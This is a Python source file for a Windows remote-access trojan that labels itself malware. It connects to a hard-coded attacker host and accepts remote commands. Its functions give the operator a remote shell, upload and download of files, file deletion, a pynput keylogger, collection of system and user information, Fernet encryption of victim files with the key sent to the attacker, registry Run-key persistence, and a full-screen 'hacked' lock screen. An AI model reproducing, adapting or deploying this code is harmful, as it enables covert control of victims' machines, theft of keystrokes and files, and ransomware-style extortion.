import socket
import sys
import os
import threading
import subprocess
import platform
import shutil
import time
import winreg
import pynput.keyboard
import requests
import getpass
import tkinter as tk
from cryptography.fernet import Fernet

root  = tk.Tk()

class so():
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port
        self.conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        while True:
            try:
                self.conn.connect((self.ip,port))
                break
            except Exception as e:
                print(e)
                time.sleep(1)

sock = so("heyhacker123454-21294.portmap.host",21294)
con = sock.conn

class file_lock:

    def __init__(self):
        self.key_k = ""
    def key_genarate(self):
        self.key_k = Fernet.generate_key()
        con.send(str(self.key_k).encode())
    
    def encrypt_file(self,file,key):
        try:
            with open(file,"rb") as f:
                data = f.read()
            f.close()
            
            encrypt_data = Fernet(key).encrypt(data)

            with open(file, "wb") as f:
                f.write(encrypt_data)
            f.close()
            con.send("encrypt sucessfully".encode())

        except Exception as e:
            con.send(str(e).encode())
    
    def decrypt_file(self,file,key):
        try:
            with open(file,"rb") as f:
                data = f.read()
            
            f.close()
            
            decrypt_data = Fernet(key).decrypt(data)

            with open(file,"wb") as f:
                f.write(decrypt_data)
            f.close()
            con.send("decrypt sucessfully".encode())
        except Exception as e:
            con.send(str(e).encode())
    
    def foleder(self,status,fold,key):
        try:
            fil = []
            for root,dir,files in os.walk(fold):
                for file in files:
                    fil.append(f"{root}\\{file}")
            
            if "decrypt_folder*" in status:
                for f in fil:
                    self.decrypt_file(f,key)
            
            elif "encrypt_folder*" in status:
                for f in fil:
                    self.encrypt_file(f,key)

        except Exception as e:
            con.send(str(e).encode())

def delete_file(cmd):
    trash,file = cmd.split("* ")
    if(os.path.exists(file)):
        try:
            os.remove(file)
            con.send("file deleted".encode())
        except Exception as e:
            con.send(e)
    else:
        con.send("file dosn't exixts".encode())

def help():
    hlp = '''help for control this malware\n
    download* [filename] download for file from victim\n
    upload* [filename] upload file to server to victim\n
    lock [for lock screen] Note:after execute this command you can't send commmand untill rerun the malware\n
    keylogger active (run keylogger)\n
    delete* [filename] for delete file from victim machine\n
    persist (for persist malware//automatic run when victim machine reboot)\n
    info (for get victim machine info)\n
    calc (for execute calculator on victim machine)\n
    [THANKS FOR USING MY MALWARE]
    '''

    con.send(hlp.encode())

def destroy():
    try:
        root.destroy()
        con.send("destroyed".encode())

    except Exception as e:
        con.send("screen can't destroyed!!".encode())

def lock_screen():
    root.title("your pc has been hack")
    root.attributes("-fullscreen",True)
    root.protocol("WM_DELETE_WINDOW",lambda:None)
    root.configure(bg="red")
    tk.Label(root,text="YOUR PC HAS BEEN HACKED!!",font=("Arial",35),fg="red",bg="white").pack(pady=50)
    root.mainloop()
    th = threading.Thread(target=root.mainloop)
    th.start()


def key_logger(cmd=""):
    def log_key(key):
        try:
            key_data = key.char
        except AttributeError:
            key_data = str(key)
        
        with open("key_log.txt", "a") as log:
            log.write(key_data)
        
    def run():
        with pynput.keyboard.Listener(on_press=log_key) as lis:
            lis.join()

    th = threading.Thread(target=run)
    th.start()
    con.send("keylogger activated".encode())

def info():

    inf = f'''
    {platform.version()},{platform.processor()},{platform.release()},
    {platform.system()},{platform.uname()},{platform.machine()},{platform.node()}
    ,{platform.win32_edition()},{getpass.getuser()}'''
    con.send(inf.encode())

def download(cmd):
    fv,file = cmd.split("download* ")
    if(os.path.exists(file)):
        try:
            size = os.path.getsize(file)
            con.send(str(size).encode())
            with open(file,"rb") as f:
                c = 0
                while c < size:
                    data = f.read(1024)
                    if not data:
                        con.send("file sent".encode())
                        break
                    con.send(data)
                    c += len(data)
                    print("sending...")
                con.send("file sent".encode())
            f.close()
        except Exception as e:
            con.send(e)
        

def upload(cmd):

    size = con.recv(999999).decode()
    sx = 0
    fc,name = cmd.split("upload* ")
    try:
        with open(name,"wb")as f:
            while sx < int(size):
                data = con.recv(1024)
                if not data:
                    break
                f.write(data)
                sx += len(data)
            con.send("file recieved".encode())
        f.close()
    except Exception as e:
        con.send(str(e).encode())

def per_sistence():

    def make_des():

        err = ""
        if not(os.path.exists(r"C:\Users\Public\Documents\my_dir")):

            try:
                os.makedirs(r"C:\Users\Public\Documents\my_dir")
            except Exception as e:
                con.send(str(e))
                pass
        else:
            # con.send("file already exixsts".encode())
            err += "file already exists"
        
        try:
            shutil.copy(sys.executable,r"C:\Users\Public\Documents\my_dir")
            # con.send("file moved".encode())
            err += "file moved\n"
            pass

        except Exception as e:
            # con.send(str(e).encode())
            err += (str(e) + "\n")
            pass

        con.send(err.encode())
    make_des()

    try:
        exec_path = r"C:\Users\Public\Documents\my_dir\virus.exe"
        path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.HKEY_CURRENT_USER
        name = "my_service"
        reg_key = winreg.OpenKey(key,path,0,winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key,name,0,winreg.REG_SZ,exec_path)
        winreg.CloseKey(reg_key)
        con.send("persisted malware!!".encode())
        pass
    except Exception as e:
        con.send(str(e).encode())
        pass

def shell(data):

    output = subprocess.Popen(data,shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
    con.send(output.stderr.read(1024))
    con.send(output.stdout.read(1024))
    output = " "
    data = " "

def travar(cmd):

    trush,dir = cmd.split("cd ")
    try:
        if(os.path.exists(dir)):
            os.chdir(dir)
            con.send("directory chnaged".encode())
        else:
            con.send("dir not found".encode())
    except Exception as e:
        con.send(e)


enc = file_lock()

def check():

    while True:
        data = con.recv(1024).decode()

        if not(data):
            con.send("try again with command")

        if "exit" in data:
            con.send("connection closed!!".encode())
        
        elif "cd " in data:
            travar(data)
        
        elif "persist" in data:
            per_sistence()
        
        elif "info" in data:
            info()
        
        elif "upload*" in data:
            upload(data)
        
        elif "download*" in data:
            download(data)

        elif "lock" in data:
            lock_screen()

        elif "destroy" in data:
            destroy()

        elif "keylogger active" in data:
            key_logger()

        elif "delete* " in data:
            delete_file(data)
        
        elif "help" in data:
            help()
        
        elif "encrypt " in data:
            cv,file,key = data.split(" ")
            enc.encrypt_file(file,key)

        elif "decrypt " in data:
            cv,file,key = data.split(" ")
            enc.decrypt_file(file,key)
        
        elif "encrypt_folder*" in data:
            trash,fold,key = data.split("*")
            enc.foleder(data,fold,key)

        elif "decrypt_folder*" in data:
            trash,fold,key = data.split("*")
            enc.foleder(data,fold,key)
            
        elif "generate_key" in data:
            enc.key_genarate()

        # elif "keylogger deactive" in data:
        #     key_logger(data)

        elif "calc" in data:
            os.system(data)
            con.send("executed".encode())

        else:
            shell(data)

check()